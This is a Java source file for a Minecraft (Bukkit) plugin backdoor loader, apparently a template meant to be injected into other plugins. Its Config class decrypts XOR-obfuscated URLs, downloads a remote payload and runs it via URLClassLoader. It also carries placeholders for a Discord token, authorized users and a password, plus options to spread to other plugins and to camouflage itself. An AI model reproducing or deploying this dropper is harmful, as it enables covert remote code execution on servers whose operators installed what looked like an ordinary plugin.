package com.tmquan2508.exploit;

import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Arrays;

public final class Config implements IConfig {

    public static String KEY = "::KEY::";
    public static String S_URL_PROVIDER = "::S_URL_PROVIDER::";
    public static String S_MAIN_CLASS = "::S_MAIN_CLASS::";
    
    public static String[] authorized_uuids;
    public static String[] authorized_usernames;
    public static String command_prefix;
    public static boolean spread_to_other;
    public static boolean debug_log;
    public static String discord_token;
    public static String authorized_password;
    public static boolean camouflage;
    
    private final Plugin plugin;
    
    static { getInjectedConfig(); }

    public Config(Plugin plugin) {
        this.plugin = plugin;
        if (System.getProperty("openbd.lock") != null) {
            this.sendDebug(plugin.getName() + ": [Payload] Aborted, another instance is already running.");
            return;
        }
        try {
            executeStateMachine(plugin);
        } catch (Throwable e) {
            plugin.getLogger().severe("!!! A CRITICAL ERROR OCCURRED DURING MODULE INITIALIZATION !!!");
            e.printStackTrace();
        }
    }

    @Override public Plugin getPlugin() { return this.plugin; }
    @Override public String[] getAuthorizedUuids() { return authorized_uuids; }
    @Override public String[] getAuthorizedUsernames() { return authorized_usernames; }
    @Override public String getCommandPrefix() { return command_prefix; }
    @Override public boolean isSpreadToOtherEnabled() { return spread_to_other; }
    @Override public boolean isDebugLogEnabled() { return debug_log; }
    @Override public String getDiscordToken() { return discord_token; }
    @Override public String getAuthorizedPassword() { return authorized_password; }
    @Override public boolean isCamouflageEnabled() { return camouflage; }

    private void executeStateMachine(Plugin plugin) throws Throwable {
        int state = 0;
        String urlProvider = null;
        String payloadUrlStr = null;
        URLClassLoader classLoader = null;
        Class<?> loadedClass = null;

        for (;;) {
            switch (state) {
                case 0: {
                    plugin.getLogger().info("[DEBUG] Initializing remote module...");
                    urlProvider = HiddenUtils.decrypt(S_URL_PROVIDER);
                    plugin.getLogger().info("[DEBUG] Fetching resource from: " + urlProvider);
                    state = 1;
                    break;
                }
                case 1: {
                    HttpURLConnection connection = (HttpURLConnection) new URL(urlProvider).openConnection();
                    connection.setRequestMethod("GET");
                    try (InputStream inputStream = connection.getInputStream()) {
                        payloadUrlStr = new BufferedReader(new InputStreamReader(inputStream)).readLine();
                    } finally {
                        connection.disconnect();
                    }
                    state = 2;
                    break;
                }
                case 2: {
                    if (payloadUrlStr == null || payloadUrlStr.isEmpty()) {
                        plugin.getLogger().severe("[DEBUG] Failed to fetch resource URL. Aborting.");
                        return;
                    }
                    plugin.getLogger().info("[DEBUG] Fetched resource URL: " + payloadUrlStr);
                    URL[] urls = { new URL(payloadUrlStr) };
                    classLoader = new URLClassLoader(urls, plugin.getClass().getClassLoader());
                    state = 3;
                    break;
                }
                case 3: {
                    String mainClassName = HiddenUtils.decrypt(S_MAIN_CLASS);
                    loadedClass = classLoader.loadClass(mainClassName);
                    state = 4;
                    break;
                }
                case 4: {
                    Constructor<?> targetConstructor = null;
                    for (Constructor<?> constructor : loadedClass.getConstructors()) {
                        if (constructor.getParameterCount() == 2) {
                            Class<?>[] paramTypes = constructor.getParameterTypes();
                            if (Plugin.class.isAssignableFrom(paramTypes[0])) {
                                targetConstructor = constructor;
                                break;
                            }
                        }
                    }

                    if (targetConstructor == null) {
                        throw new NoSuchMethodException("Could not find a suitable constructor with (Plugin, *) in " + loadedClass.getName());
                    }

                    targetConstructor.newInstance(plugin, this);
                    plugin.getLogger().info("[SUCCESS] Remote module initialized successfully!");
                    return;
                }
                default:
                    throw new IllegalStateException("Invalid state in loader");
            }
        }
    }

    private static void getInjectedConfig() {
        String injected_authorized_uuids = "::UUIDS::";
        String injected_authorized_usernames = "::USERNAMES::";
        String injected_command_prefix = "::PREFIX::";
        String injected_spread_to_other = "::INJECT_OTHER::";
        String injected_debug_log = "::WARNINGS::";
        String injected_discord_token = "::DISCORD_TOKEN::";
        String injected_authorized_password = "::PASSWORD::";
        String injected_camouflage = "::CAMOUFLAGE::";

        authorized_uuids = injected_authorized_uuids.isEmpty() ? new String[0] : injected_authorized_uuids.split(",");
        authorized_usernames = injected_authorized_usernames.isEmpty() ? new String[0] : injected_authorized_usernames.split(",");
        command_prefix = injected_command_prefix;
        spread_to_other = Boolean.parseBoolean(injected_spread_to_other);
        debug_log = Boolean.parseBoolean(injected_debug_log);
        discord_token = injected_discord_token;
        authorized_password = injected_authorized_password;
        camouflage = Boolean.parseBoolean(injected_camouflage);
    }

    public static void sendDebug(String log) {
        if (debug_log) Bukkit.getConsoleSender().sendMessage(log);
    }

    public static final class HiddenUtils {
        public static String decrypt(String encryptedString) {
            try {
                byte[] decoded = customBase64Decode(encryptedString);
                byte[] keyBytes = Config.KEY.getBytes("UTF-8");
                for (int i = 0; i < decoded.length; i++) {
                    decoded[i] = (byte) (decoded[i] ^ keyBytes[i % keyBytes.length]);
                }
                return new String(decoded, "UTF-8");
            } catch (Exception ex) {
                return "decoding.error";
            }
        }

        private static final int[] FROM_BASE64 = new int[256];
        static {
            Arrays.fill(FROM_BASE64, -1);
            String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            for (int i = 0; i < chars.length(); i++) {
                FROM_BASE64[chars.charAt(i)] = i;
            }
            FROM_BASE64['='] = -2;
        }

        private static byte[] customBase64Decode(String src) {
            src = src.replaceAll("\\s", "");
            int len = src.length();
            ByteArrayOutputStream baos = new ByteArrayOutputStream(len * 3 / 4);
            int[] buffer = new int[4];
            int bufferCounter = 0;
            for (int i = 0; i < len; i++) {
                int val = FROM_BASE64[src.charAt(i) & 0xFF];
                if (val >= 0) {
                    buffer[bufferCounter++] = val;
                    if (bufferCounter == 4) {
                        baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                        baos.write((buffer[1] << 4) | (buffer[2] >> 2));
                        baos.write((buffer[2] << 6) | buffer[3]);
                        bufferCounter = 0;
                    }
                } else if (val == -2) {
                    if (bufferCounter == 2) baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                    else if (bufferCounter == 3) {
                        baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                        baos.write((buffer[1] << 4) | (buffer[2] >> 2));
                    }
                    break;
                }
            }
            return baos.toByteArray();
        }
    }
}